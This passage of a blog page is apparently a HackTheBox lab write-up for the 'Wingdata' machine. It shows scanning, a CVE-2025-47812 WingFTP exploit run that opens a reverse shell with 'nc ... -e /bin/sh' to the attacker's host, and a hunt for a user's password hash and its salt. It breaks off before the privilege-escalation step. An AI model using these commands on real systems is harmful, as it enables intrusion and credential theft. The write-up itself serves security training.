@@ -1,0 +1,476 @@
+<!doctype html>
+<html lang="en" data-scheme="river" data-schemes="river">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>HackTheBox: Wingdata · river</title>
+    <meta name="description" content="exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root">
+    <meta name="author" content="river">
+    <link rel="canonical" href="https://rivers.sh/posts/htb-wingdata/">
+    <meta property="og:site_name" content="river">
+    <meta property="og:title" content="HackTheBox: Wingdata">
+    <meta property="og:description" content="exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root">
+    <meta property="og:url" content="https://rivers.sh/posts/htb-wingdata/">
+    <meta property="og:type" content="article">
+    <meta property="og:image" content="https://rivers.sh/images/og.jpg">
+    <meta name="twitter:card" content="summary">
+    <link rel="icon" href="/images/favicon.svg" type="image/svg+xml">
+    <link rel="alternate" type="application/atom+xml" title="river" href="/atom.xml">
+    <link rel="preload" href="/fonts/MesloLGS-Regular.ttf" as="font" type="font/ttf" crossorigin>
+    <link rel="stylesheet" href="/css/style.css">
+    <link rel="stylesheet" href="/css/syntax.css">
+    <script>
+    // Runs before first paint: restore the visitor's colour scheme and pick the
+    // background art, so neither flashes in after load.
+    (function () {
+      var d = document.documentElement;
+      try {
+        var s = localStorage.getItem("scheme");
+        if (s && d.getAttribute("data-schemes").split(" ").indexOf(s) !== -1) d.setAttribute("data-scheme", s);
+      } catch (e) {}
+      var art = ["/images/art/art1.jpg"];
+      if (!art.length) return;
+      var i = Math.floor(Math.random() * art.length);
+      try {
+        // don't show the same art twice in a row
+        var last = parseInt(localStorage.getItem("art-last"), 10);
+        if (art.length > 1 && i === last) i = (i + 1 + Math.floor(Math.random() * (art.length - 1))) % art.length;
+        localStorage.setItem("art-last", i);
+      } catch (e) {}
+      var a = typeof art[i] === "string" ? { src: art[i] } : art[i];
+      d.style.setProperty("--art", 'url("' + a.src + '")');
+      d.style.setProperty("--art-pos", a.position || "right bottom");
+      d.setAttribute("data-art", "");
+    })();
+    </script>
+</head>
+<body class="is-post">
+    <a class="skip-link" href="#main">skip to content</a>
+    <div class="page">
+        <header class="site-header">
+    <a class="site-title" href="/">river</a>
+    <nav class="site-nav" aria-label="site">
+        <ul><li><a href="/">home</a></li><li><a href="/blog/">blog</a></li><li><a href="/categories/">categories</a></li><li><a href="/tags/">tags</a></li><li><a href="/search/">search</a></li></ul>
+    </nav>
+</header>
+
+        <main id="main">
+<article class="post h-entry">
+    <header class="post-header">
+        <h1 class="post-title p-name">HackTheBox: Wingdata</h1>
+        <!-- no whitespace between items: the "|" separators supply the spacing -->
+        <div class="post-meta"><time class="dt-published" datetime="2026-03-20">Mar 20, 2026</time><span>9 min read</span><span class="post-cats"><a href="/categories/htb/">HTB</a> › <a href="/categories/htb/linux/">Linux</a> › <a href="/categories/htb/linux/easy/">Easy</a></span><span class="post-tags"><a class="p-category" href="/tags/linux/">#Linux</a> <a class="p-category" href="/tags/hackthebox/">#HackTheBox</a> <a class="p-category" href="/tags/wingftp/">#WingFTP</a></span></div>
+        <p class="post-description p-summary">exploiting CVE-2025-47812 lua injection in WingFTP for RCE, cracking a salted sha256 hash, then abusing CVE-2025-4138 PATH_MAX overflow to escape tarfile filter and get root</p>
+    </header>
+
+    
+    <details class="toc toc-inline">
+        <summary>contents</summary>
+        <nav aria-label="contents"><ol><li class="toc-h2"><a href="#tldr">tldr:</a></li><li class="toc-h2"><a href="#rce-revshell">rce-&gt;revshell</a></li></ol></nav>
+    </details>
+    
+
+    <div class="prose e-content" tabindex="-1">
+
+<h1 id="reconnaisance">reconnaisance</h1>
+<div class="sourceCode" id="cb1"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nmap <span class="at">-sC</span> <span class="at">-sV</span> 10.129.6.216</span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="ex">Starting</span> Nmap 7.95 <span class="er">(</span> <span class="ex">https://nmap.org</span> <span class="kw">)</span> <span class="ex">at</span> 2026-03-20 02:03 CDT</span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> scan report for wingdata.htb <span class="er">(</span><span class="ex">10.129.6.216</span><span class="kw">)</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="ex">Host</span> is up <span class="er">(</span><span class="ex">0.043s</span> latency<span class="kw">)</span><span class="bu">.</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a><span class="ex">Not</span> shown: 998 filtered tcp ports <span class="er">(</span><span class="ex">no-response</span><span class="kw">)</span></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="ex">PORT</span>   STATE SERVICE VERSION</span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="ex">22/tcp</span> open  ssh     OpenSSH 9.2p1 Debian 2+deb12u7 <span class="er">(</span><span class="ex">protocol</span> 2.0<span class="kw">)</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span> <span class="ex">ssh-hostkey:</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span>   <span class="ex">256</span> a1:fa:95:8b:d7:56:03:85:e4:45:c9:c7:1e:ba:28:3b <span class="er">(</span><span class="ex">ECDSA</span><span class="kw">)</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_</span>  256 9c:ba:21:1a:97:2f:3a:64:73:c1:4c:1d:ce:65:7a:2f <span class="er">(</span><span class="ex">ED25519</span><span class="kw">)</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="ex">80/tcp</span> open  http    Apache httpd 2.4.66</span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-title:</span> WingData Solutions</span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="kw">|</span><span class="ex">_http-server-header:</span> Apache/2.4.66 <span class="er">(</span><span class="ex">Debian</span><span class="kw">)</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> Info: Host: localhost<span class="kw">;</span> <span class="ex">OS:</span> Linux<span class="kw">;</span> <span class="ex">CPE:</span> cpe:/o:linux:linux_kernel</span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a><span class="ex">Service</span> detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="ex">Nmap</span> done: 1 IP address <span class="er">(</span><span class="ex">1</span> host up<span class="kw">)</span> <span class="ex">scanned</span> in 16.33 seconds</span></code></pre></div>
+<div class="sourceCode" id="cb2"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="ex">┌──</span><span class="er">(</span><span class="ex">river㉿marcialwin11</span><span class="kw">)</span><span class="ex">-[~/htb/wingdata]</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="ex">└─$</span> ffuf <span class="at">-u</span> http://wingdata.htb <span class="at">-H</span> <span class="st">&#39;Host: FUZZ.wingdata.htb&#39;</span> <span class="at">-w</span> /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt <span class="at">-fc</span> 301</span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a>        <span class="ex">/</span><span class="st">&#39;___\  /&#39;</span><span class="ex">___\</span>           /<span class="st">&#39;___\</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a><span class="st">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="st">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a><span class="st">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a><span class="st">         \ \_\   \ \_\  \ \____/  \ \_\</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a><span class="st">          \/_/    \/_/   \/___/    \/_/</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a><span class="st">       v2.1.0-dev</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a><span class="st">________________________________________________</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Method           : GET</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a><span class="st"> :: URL              : http://wingdata.htb</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt</span></span>
+<span id="cb2-17"><a href="#cb2-17" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Header           : Host: FUZZ.wingdata.htb</span></span>
+<span id="cb2-18"><a href="#cb2-18" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Follow redirects : false</span></span>
+<span id="cb2-19"><a href="#cb2-19" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Calibration      : false</span></span>
+<span id="cb2-20"><a href="#cb2-20" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Timeout          : 10</span></span>
+<span id="cb2-21"><a href="#cb2-21" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Threads          : 40</span></span>
+<span id="cb2-22"><a href="#cb2-22" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500</span></span>
+<span id="cb2-23"><a href="#cb2-23" aria-hidden="true" tabindex="-1"></a><span class="st"> :: Filter           : Response status: 301</span></span>
+<span id="cb2-24"><a href="#cb2-24" aria-hidden="true" tabindex="-1"></a><span class="st">________________________________________________</span></span>
+<span id="cb2-25"><a href="#cb2-25" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-26"><a href="#cb2-26" aria-hidden="true" tabindex="-1"></a><span class="st">ftp                     [Status: 200, Size: 678, Words: 44, Lines: 10, Duration: 50ms]</span></span>
+<span id="cb2-27"><a href="#cb2-27" aria-hidden="true" tabindex="-1"></a><span class="st">:: Progress: [4989/4989] :: Job [1/1] :: 934 req/sec :: Duration: [0:00:05] :: Errors: 0 ::</span></span></code></pre></div>
+<p><img src="/images/wingdata/Pasted%20image%2020260320021553.png" alt="wingftp version disclosure" /><br />
+wingftp with version disclosure</p>
+<h1 id="cve-2025-47812-for-foothold">CVE-<a href="https://nvd.nist.gov/vuln/detail/CVE-2025-47812" target="_blank" rel="noopener">2025-47812</a> for foothold</h1>
+<h2 id="tldr"><a href="#tldr" class="anchor">#</a>tldr:</h2>
+<p>This vulnerability arises from improper handling of NULL bytes in the <code>'username'</code><br />
+parameter during login, leading to Lua code injection into session files. These maliciously crafted session files are subsequently executed when authenticated functionalities (e.g., <code>/dir.html</code>) are accessed, resulting in arbitrary command execution on the server with elevated privileges (root on Linux, SYSTEM on Windows). The exploit leverages a discrepancy between the string processing in <code>c_CheckUser()</code> (which truncates at NULL) and the session creation logic (which uses the full unsanitized username).</p>
+<h2 id="rce-revshell"><a href="#rce-revshell" class="anchor">#</a>rce-&gt;revshell</h2>
+<div class="sourceCode" id="cb3"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> python3 poc.py <span class="at">-u</span> http://ftp.wingdata.htb <span class="at">-c</span> <span class="st">&quot;nc 10.10.15.90 4444 -e /bin/sh&quot;</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a><span class="ex">[*]</span> Testing target: http://ftp.wingdata.htb</span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Sending POST request to http://ftp.wingdata.htb/loginok.html with command: <span class="st">&#39;nc 10.10.15.90 4444 -e /bin/sh&#39;</span> and username: <span class="st">&#39;anonymous&#39;</span></span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> UID extracted: b6ce6368025bd4dddef232c031238ce4f528764d624db129b32c21fbca0cb8d6</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a><span class="ex">[+]</span> Sending GET request to http://ftp.wingdata.htb/dir.html with UID: b6ce6368025bd4dddef232c031238ce4f528764d624db129b32c21fbca0cb8d6</span></code></pre></div>
+<div class="sourceCode" id="cb4"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb4-1"><a href="#cb4-1" aria-hidden="true" tabindex="-1"></a><span class="ex">$</span> nc <span class="at">-lvnp</span> 4444</span></code></pre></div>
+<h1 id="own-wacky">own wacky</h1>
+<p>interesting directory:</p>
+<div class="sourceCode" id="cb5"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb5-1"><a href="#cb5-1" aria-hidden="true" tabindex="-1"></a><span class="ex">/opt/wftpserver/Data/1/users</span></span></code></pre></div>
+<p><code>ls</code> yields:</p>
+<div class="sourceCode" id="cb6"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb6-1"><a href="#cb6-1" aria-hidden="true" tabindex="-1"></a><span class="ex">anonymous.xml</span></span>
+<span id="cb6-2"><a href="#cb6-2" aria-hidden="true" tabindex="-1"></a><span class="ex">john.xml</span></span>
+<span id="cb6-3"><a href="#cb6-3" aria-hidden="true" tabindex="-1"></a><span class="ex">maria.xml</span></span>
+<span id="cb6-4"><a href="#cb6-4" aria-hidden="true" tabindex="-1"></a><span class="ex">steve.xml</span></span>
+<span id="cb6-5"><a href="#cb6-5" aria-hidden="true" tabindex="-1"></a><span class="ex">wacky.xml</span></span></code></pre></div>
+<p><code>wacky.xml</code> yields:</p>
+<div class="sourceCode" id="cb7"><pre class="sourceCode xml"><code class="sourceCode xml"><span id="cb7-1"><a href="#cb7-1" aria-hidden="true" tabindex="-1"></a>cat wacky.xml</span>
+<span id="cb7-2"><a href="#cb7-2" aria-hidden="true" tabindex="-1"></a><span class="fu">&lt;?xml</span> <span class="ot">version=</span><span class="st">&quot;1.0&quot;</span> <span class="fu">?&gt;</span></span>
+<span id="cb7-3"><a href="#cb7-3" aria-hidden="true" tabindex="-1"></a>&lt;<span class="kw">USER_ACCOUNTS</span> <span class="ot">Description=</span><span class="st">&quot;Wing FTP Server User Accounts&quot;</span>&gt;</span>
+<span id="cb7-4"><a href="#cb7-4" aria-hidden="true" tabindex="-1"></a>    &lt;<span class="kw">USER</span>&gt;</span>
+<span id="cb7-5"><a href="#cb7-5" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">UserName</span>&gt;wacky&lt;/<span class="kw">UserName</span>&gt;</span>
+<span id="cb7-6"><a href="#cb7-6" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableAccount</span>&gt;1&lt;/<span class="kw">EnableAccount</span>&gt;</span>
+<span id="cb7-7"><a href="#cb7-7" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnablePassword</span>&gt;1&lt;/<span class="kw">EnablePassword</span>&gt;</span>
+<span id="cb7-8"><a href="#cb7-8" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">Password</span>&gt;32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca&lt;/<span class="kw">Password</span>&gt;</span>
+<span id="cb7-9"><a href="#cb7-9" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">ProtocolType</span>&gt;63&lt;/<span class="kw">ProtocolType</span>&gt;</span>
+<span id="cb7-10"><a href="#cb7-10" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableExpire</span>&gt;0&lt;/<span class="kw">EnableExpire</span>&gt;</span>
+<span id="cb7-11"><a href="#cb7-11" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">ExpireTime</span>&gt;2025-12-02 12:02:46&lt;/<span class="kw">ExpireTime</span>&gt;</span>
+<span id="cb7-12"><a href="#cb7-12" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxDownloadSpeedPerSession</span>&gt;0&lt;/<span class="kw">MaxDownloadSpeedPerSession</span>&gt;</span>
+<span id="cb7-13"><a href="#cb7-13" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxUploadSpeedPerSession</span>&gt;0&lt;/<span class="kw">MaxUploadSpeedPerSession</span>&gt;</span>
+<span id="cb7-14"><a href="#cb7-14" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxDownloadSpeedPerUser</span>&gt;0&lt;/<span class="kw">MaxDownloadSpeedPerUser</span>&gt;</span>
+<span id="cb7-15"><a href="#cb7-15" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxUploadSpeedPerUser</span>&gt;0&lt;/<span class="kw">MaxUploadSpeedPerUser</span>&gt;</span>
+<span id="cb7-16"><a href="#cb7-16" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">SessionNoCommandTimeOut</span>&gt;5&lt;/<span class="kw">SessionNoCommandTimeOut</span>&gt;</span>
+<span id="cb7-17"><a href="#cb7-17" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">SessionNoTransferTimeOut</span>&gt;5&lt;/<span class="kw">SessionNoTransferTimeOut</span>&gt;</span>
+<span id="cb7-18"><a href="#cb7-18" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxConnection</span>&gt;0&lt;/<span class="kw">MaxConnection</span>&gt;</span>
+<span id="cb7-19"><a href="#cb7-19" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">ConnectionPerIp</span>&gt;0&lt;/<span class="kw">ConnectionPerIp</span>&gt;</span>
+<span id="cb7-20"><a href="#cb7-20" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">PasswordLength</span>&gt;0&lt;/<span class="kw">PasswordLength</span>&gt;</span>
+<span id="cb7-21"><a href="#cb7-21" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">ShowHiddenFile</span>&gt;0&lt;/<span class="kw">ShowHiddenFile</span>&gt;</span>
+<span id="cb7-22"><a href="#cb7-22" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CanChangePassword</span>&gt;0&lt;/<span class="kw">CanChangePassword</span>&gt;</span>
+<span id="cb7-23"><a href="#cb7-23" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CanSendMessageToServer</span>&gt;0&lt;/<span class="kw">CanSendMessageToServer</span>&gt;</span>
+<span id="cb7-24"><a href="#cb7-24" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableSSHPublicKeyAuth</span>&gt;0&lt;/<span class="kw">EnableSSHPublicKeyAuth</span>&gt;</span>
+<span id="cb7-25"><a href="#cb7-25" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">SSHPublicKeyPath</span>&gt;&lt;/<span class="kw">SSHPublicKeyPath</span>&gt;</span>
+<span id="cb7-26"><a href="#cb7-26" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">SSHAuthMethod</span>&gt;0&lt;/<span class="kw">SSHAuthMethod</span>&gt;</span>
+<span id="cb7-27"><a href="#cb7-27" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableWeblink</span>&gt;1&lt;/<span class="kw">EnableWeblink</span>&gt;</span>
+<span id="cb7-28"><a href="#cb7-28" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableUplink</span>&gt;1&lt;/<span class="kw">EnableUplink</span>&gt;</span>
+<span id="cb7-29"><a href="#cb7-29" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableTwoFactor</span>&gt;0&lt;/<span class="kw">EnableTwoFactor</span>&gt;</span>
+<span id="cb7-30"><a href="#cb7-30" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">TwoFactorCode</span>&gt;&lt;/<span class="kw">TwoFactorCode</span>&gt;</span>
+<span id="cb7-31"><a href="#cb7-31" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">ExtraInfo</span>&gt;&lt;/<span class="kw">ExtraInfo</span>&gt;</span>
+<span id="cb7-32"><a href="#cb7-32" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CurrentCredit</span>&gt;0&lt;/<span class="kw">CurrentCredit</span>&gt;</span>
+<span id="cb7-33"><a href="#cb7-33" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">RatioDownload</span>&gt;1&lt;/<span class="kw">RatioDownload</span>&gt;</span>
+<span id="cb7-34"><a href="#cb7-34" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">RatioUpload</span>&gt;1&lt;/<span class="kw">RatioUpload</span>&gt;</span>
+<span id="cb7-35"><a href="#cb7-35" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">RatioCountMethod</span>&gt;0&lt;/<span class="kw">RatioCountMethod</span>&gt;</span>
+<span id="cb7-36"><a href="#cb7-36" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableRatio</span>&gt;0&lt;/<span class="kw">EnableRatio</span>&gt;</span>
+<span id="cb7-37"><a href="#cb7-37" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxQuota</span>&gt;0&lt;/<span class="kw">MaxQuota</span>&gt;</span>
+<span id="cb7-38"><a href="#cb7-38" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CurrentQuota</span>&gt;0&lt;/<span class="kw">CurrentQuota</span>&gt;</span>
+<span id="cb7-39"><a href="#cb7-39" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableQuota</span>&gt;0&lt;/<span class="kw">EnableQuota</span>&gt;</span>
+<span id="cb7-40"><a href="#cb7-40" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesName</span>&gt;&lt;/<span class="kw">NotesName</span>&gt;</span>
+<span id="cb7-41"><a href="#cb7-41" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesAddress</span>&gt;&lt;/<span class="kw">NotesAddress</span>&gt;</span>
+<span id="cb7-42"><a href="#cb7-42" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesZipCode</span>&gt;&lt;/<span class="kw">NotesZipCode</span>&gt;</span>
+<span id="cb7-43"><a href="#cb7-43" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesPhone</span>&gt;&lt;/<span class="kw">NotesPhone</span>&gt;</span>
+<span id="cb7-44"><a href="#cb7-44" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesFax</span>&gt;&lt;/<span class="kw">NotesFax</span>&gt;</span>
+<span id="cb7-45"><a href="#cb7-45" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesEmail</span>&gt;&lt;/<span class="kw">NotesEmail</span>&gt;</span>
+<span id="cb7-46"><a href="#cb7-46" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">NotesMemo</span>&gt;&lt;/<span class="kw">NotesMemo</span>&gt;</span>
+<span id="cb7-47"><a href="#cb7-47" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableUploadLimit</span>&gt;0&lt;/<span class="kw">EnableUploadLimit</span>&gt;</span>
+<span id="cb7-48"><a href="#cb7-48" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CurLimitUploadSize</span>&gt;0&lt;/<span class="kw">CurLimitUploadSize</span>&gt;</span>
+<span id="cb7-49"><a href="#cb7-49" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxLimitUploadSize</span>&gt;0&lt;/<span class="kw">MaxLimitUploadSize</span>&gt;</span>
+<span id="cb7-50"><a href="#cb7-50" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableDownloadLimit</span>&gt;0&lt;/<span class="kw">EnableDownloadLimit</span>&gt;</span>
+<span id="cb7-51"><a href="#cb7-51" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">CurLimitDownloadLimit</span>&gt;0&lt;/<span class="kw">CurLimitDownloadLimit</span>&gt;</span>
+<span id="cb7-52"><a href="#cb7-52" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">MaxLimitDownloadLimit</span>&gt;0&lt;/<span class="kw">MaxLimitDownloadLimit</span>&gt;</span>
+<span id="cb7-53"><a href="#cb7-53" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">LimitResetType</span>&gt;0&lt;/<span class="kw">LimitResetType</span>&gt;</span>
+<span id="cb7-54"><a href="#cb7-54" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">LimitResetTime</span>&gt;1762103089&lt;/<span class="kw">LimitResetTime</span>&gt;</span>
+<span id="cb7-55"><a href="#cb7-55" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">TotalReceivedBytes</span>&gt;0&lt;/<span class="kw">TotalReceivedBytes</span>&gt;</span>
+<span id="cb7-56"><a href="#cb7-56" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">TotalSentBytes</span>&gt;0&lt;/<span class="kw">TotalSentBytes</span>&gt;</span>
+<span id="cb7-57"><a href="#cb7-57" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">LoginCount</span>&gt;2&lt;/<span class="kw">LoginCount</span>&gt;</span>
+<span id="cb7-58"><a href="#cb7-58" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">FileDownload</span>&gt;0&lt;/<span class="kw">FileDownload</span>&gt;</span>
+<span id="cb7-59"><a href="#cb7-59" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">FileUpload</span>&gt;0&lt;/<span class="kw">FileUpload</span>&gt;</span>
+<span id="cb7-60"><a href="#cb7-60" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">FailedDownload</span>&gt;0&lt;/<span class="kw">FailedDownload</span>&gt;</span>
+<span id="cb7-61"><a href="#cb7-61" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">FailedUpload</span>&gt;0&lt;/<span class="kw">FailedUpload</span>&gt;</span>
+<span id="cb7-62"><a href="#cb7-62" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">LastLoginIp</span>&gt;127.0.0.1&lt;/<span class="kw">LastLoginIp</span>&gt;</span>
+<span id="cb7-63"><a href="#cb7-63" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">LastLoginTime</span>&gt;2025-11-02 12:28:52&lt;/<span class="kw">LastLoginTime</span>&gt;</span>
+<span id="cb7-64"><a href="#cb7-64" aria-hidden="true" tabindex="-1"></a>        &lt;<span class="kw">EnableSchedule</span>&gt;0&lt;/<span class="kw">EnableSchedule</span>&gt;</span>
+<span id="cb7-65"><a href="#cb7-65" aria-hidden="true" tabindex="-1"></a>    &lt;/<span class="kw">USER</span>&gt;</span>
+<span id="cb7-66"><a href="#cb7-66" aria-hidden="true" tabindex="-1"></a>&lt;/<span class="kw">USER_ACCOUNTS</span>&gt;</span></code></pre></div>
+<p>hardcoded password hash that we can crack !</p>
+<h1 id="cracking-wackys-password">cracking wacky's password</h1>
+<p>banged my head against a wall for an hour, even switched from john to hashcat, still no luck</p>
+<p>eventually came to the realization that the password hash might be salted</p>
+<p>eventually ran this find + grep combo to try to find any salts:</p>
+<div class="sourceCode" id="cb8"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb8-1"><a href="#cb8-1" aria-hidden="true" tabindex="-1"></a><span class="fu">find</span> / <span class="at">-name</span> <span class="st">&quot;*.lua&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null <span class="kw">|</span> <span class="fu">xargs</span> grep <span class="at">-i</span> <span class="st">&quot;sha\|hash\|pass&quot;</span> <span class="dv">2</span><span class="op">&gt;</span>/dev/null</span></code></pre></div>
+<p>which yielded lots of slop, but also a few gems...</p>
+<p>from ServerInterface.lua:</p>
+<div class="sourceCode" id="cb9"><pre class="sourceCode sh"><code class="sourceCode bash"><span id="cb9-1"><a href="#cb9-1" aria-hidden="true" tabindex="-1"></a><span class="bu">local</span> <span class="va">temppass</span> <span class="op">=</span> <span class="va">admin</span>.password..<span class="st">&quot;WingFTP&quot;</span></span>
